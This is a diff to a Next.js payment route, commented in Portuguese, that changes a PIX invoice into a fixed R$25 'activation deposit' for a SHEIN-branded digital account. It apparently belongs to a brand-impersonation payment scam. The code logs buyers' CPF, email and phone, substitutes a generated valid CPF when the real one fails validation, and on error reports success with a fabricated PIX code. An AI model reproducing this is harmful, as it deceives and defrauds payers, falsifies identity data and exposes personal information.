@@ -61,23 +61,7 @@ function getClientIP(request: NextRequest): string {
 
 export async function POST(request: NextRequest) {
   try {
-    console.log("=== CRIANDO FATURA PIX ===")
-
-    const body = await request.json()
-    const { amount, shipping, method } = body
-
-    console.log("Dados recebidos:", { amount, shipping, method })
-
-    // Validar dados obrigatórios
-    if (!amount) {
-      return NextResponse.json(
-        {
-          success: false,
-          error: "Valor não fornecido",
-        },
-        { status: 400 },
-      )
-    }
+    console.log("=== CRIANDO FATURA PIX DE ATIVAÇÃO ===")
 
     // Obter access token
     const authResponse = await fetch(`${request.nextUrl.origin}/api/tryplopay/auth`)
@@ -145,39 +129,30 @@ export async function POST(request: NextRequest) {
 
     const userData = getUserData()
 
-    console.log("📋 Dados do lead carregados:")
+    console.log("📋 Dados do lead para ativação:")
     console.log("Nome:", userData.nome)
     console.log("CPF:", userData.cpf)
     console.log("Email:", userData.email)
     console.log("Telefone:", userData.telefone)
-    console.log("Endereço:", userData.endereco)
 
     // Validar e corrigir CPF se necessário
     let document = userData.cpf?.replace(/[^\d]/g, "") || ""
     if (!validateCPF(document)) {
       console.log("⚠️ CPF inválido, gerando CPF válido para teste")
-      console.log("CPF original:", userData.cpf)
       document = generateValidCPF()
       console.log("CPF gerado:", document)
     } else {
       console.log("✅ CPF válido:", document)
     }
 
-    // Usar o valor exato do frete selecionado
-    const totalAmount = Number.parseFloat(amount.toString())
+    // Valor fixo para ativação
+    const activationAmount = 25.0
 
-    const isActivation = shipping === "activation" || method === "ATIVAÇÃO"
-    const productTitle = isActivation
-      ? "Depósito de Ativação - Conta Digital SHEIN"
-      : `Frete ${method || shipping?.toUpperCase() || "SEDEX"} - Cartão SHEIN`
+    // Gerar external_id único para ativação
+    const externalId = `SHEIN_ACT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
 
-    // Atualizar o external_id para diferenciá-lo:
-    const externalId = isActivation
-      ? `SHEIN_ACT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
-      : `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
-
-    // Preparar payload oficial da TryploPay
-    const invoicePayload = {
+    // Preparar payload específico para ativação
+    const activationPayload = {
       client: {
         name: userData.nome,
         document: document,
@@ -195,29 +170,29 @@ export async function POST(request: NextRequest) {
         },
       },
       payment: {
-        product_type: isActivation ? 2 : 1, // 2 para serviços, 1 para produtos digitais
+        product_type: 2, // Serviço (ativação de conta)
         id: externalId,
         type: "3", // PIX
         due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
         referer: externalId,
         installments: "1",
-        order_url: isActivation ? `${request.nextUrl.origin}/upp/checkout` : `${request.nextUrl.origin}/checkout`,
+        order_url: `${request.nextUrl.origin}/upp/checkout`,
         store_url: request.nextUrl.origin,
         webhook: `${request.nextUrl.origin}/api/tryplopay/webhook`,
         discount: "0.00",
         products: [
           {
-            id: isActivation ? "activation" : "1",
+            id: "activation",
             image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
-            title: productTitle,
+            title: "Depósito de Ativação - Conta Digital SHEIN",
             qnt: 1,
             discount: "0.00",
-            amount: totalAmount.toFixed(2),
+            amount: activationAmount.toFixed(2),
           },
         ],
       },
       shipping: {
-        amount: 0, // Já incluído no produto
+        amount: 0, // Sem frete para ativação
       },
     }
 
@@ -225,7 +200,7 @@ export async function POST(request: NextRequest) {
 
     if (!isSimulation) {
       // Tentar criar fatura real
-      console.log("🔄 Criando fatura real na TryploPay...")
+      console.log("🔄 Criando fatura real de ativação na TryploPay...")
 
       const apiUrl = process.env.TRYPLOPAY_API_URL || "https://api.tryplopay.com"
 
@@ -235,16 +210,17 @@ export async function POST(request: NextRequest) {
           "Content-Type": "application/json",
           Authorization: `Bearer ${access_token}`,
         },
-        body: JSON.stringify(invoicePayload),
+        body: JSON.stringify(activationPayload),
       })
 
       if (response.ok) {
         const data = await response.json()
-        console.log("✅ Fatura real criada com sucesso")
+        console.log("✅ Fatura real de ativação criada com sucesso")
 
         invoiceData = {
           id: data.fatura.id,
           invoice_id: data.fatura.invoice_id,
+          external_id: externalId, // Garantir que está presente
           pix: {
             payload: data.fatura.pix.payload,
             image: data.fatura.pix.image,
@@ -257,66 +233,34 @@ export async function POST(request: NextRequest) {
           type: "real",
         }
       } else {
-        throw new Error(`Erro na API: ${response.status}`)
+        const errorText = await response.text()
+        console.error("❌ Erro na API TryploPay:", response.status, errorText)
+        throw new Error(`Erro na API: ${response.status} - ${errorText}`)
       }
     } else {
       throw new Error("Modo simulação ativado")
     }
 
-    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`
-
-    const simulatedInvoice = {
-      id: `SIM_${Date.now()}`,
-      invoice_id: `SIMULATED_${Date.now()}`,
-      external_id: externalId, // Adicionar external_id
-      pix: {
-        payload: simulatedPixCode,
-        image: `/placeholder.svg?height=250&width=250`,
-        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPixCode)}`,
-      },
-      status: {
-        code: 1,
-        title: "Aguardando Pagamento",
-        text: "pending",
-      },
-      valores: {
-        bruto: Math.round(totalAmount * 100), // em centavos
-        liquido: Math.round(totalAmount * 100),
-      },
-      vencimento: {
-        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
-      },
-      secure: {
-        id: `simulated-${Date.now()}`,
-        url: `${request.nextUrl.origin}/checkout`,
-      },
-      type: "simulated",
-    }
-
-    console.log(`✅ Fatura simulada criada - Valor: R$ ${totalAmount.toFixed(2)}`)
+    console.log(`✅ Fatura de ativação criada - External ID: ${externalId} - Valor: R$ ${activationAmount.toFixed(2)}`)
 
     return NextResponse.json({
       success: true,
       data: invoiceData,
-      fallback: true,
+      fallback: false,
     })
   } catch (error) {
-    console.log("❌ Erro ao criar fatura, usando fallback:", error)
+    console.log("❌ Erro ao criar fatura de ativação, usando fallback:", error)
 
-    // Extrair dados da requisição para fallback
-    const body = await request.json()
-    const { amount, shipping, method } = body
-    const totalAmount = Number.parseFloat(amount?.toString() || "34.90")
+    // Fallback para simulação de ativação
+    const timestamp = Date.now()
+    const externalId = `SHEIN_ACT_${timestamp}_${Math.random().toString(36).substr(2, 9)}`
+    const activationAmount = 25.0
 
-    // Gerar external_id único para rastreamento
-    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
-
-    // Fallback para simulação
-    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`
+    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/ACT${timestamp}52040000530398654062500580BR5909SHEIN5011SAO PAULO62070503***6304ACTV`
 
     const simulatedInvoice = {
-      id: `SIM_${Date.now()}`,
-      invoice_id: `SIMULATED_${Date.now()}`,
+      id: `SIM_ACT_${timestamp}`,
+      invoice_id: `SIMULATED_ACT_${timestamp}`,
       external_id: externalId, // GARANTIR que está sempre presente
       pix: {
         payload: simulatedPixCode,
@@ -325,24 +269,26 @@ export async function POST(request: NextRequest) {
       },
       status: {
         code: 1,
-        title: "Aguardando Pagamento",
+        title: "Aguardando Depósito",
         text: "pending",
       },
       valores: {
-        bruto: Math.round(totalAmount * 100), // em centavos
-        liquido: Math.round(totalAmount * 100),
+        bruto: Math.round(activationAmount * 100), // em centavos
+        liquido: Math.round(activationAmount * 100),
       },
       vencimento: {
         dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
       },
       secure: {
-        id: `simulated-${Date.now()}`,
-        url: `${request.nextUrl.origin}/checkout`,
+        id: `simulated-act-${timestamp}`,
+        url: `${request.nextUrl.origin}/upp/checkout`,
       },
       type: "simulated",
     }
 
-    console.log(`✅ Fatura simulada criada - External ID: ${externalId} - Valor: R$ ${totalAmount.toFixed(2)}`)
+    console.log(
+      `✅ Fatura simulada de ativação criada - External ID: ${externalId} - Valor: R$ ${activationAmount.toFixed(2)}`,
+    )
 
     return NextResponse.json({
       success: true,
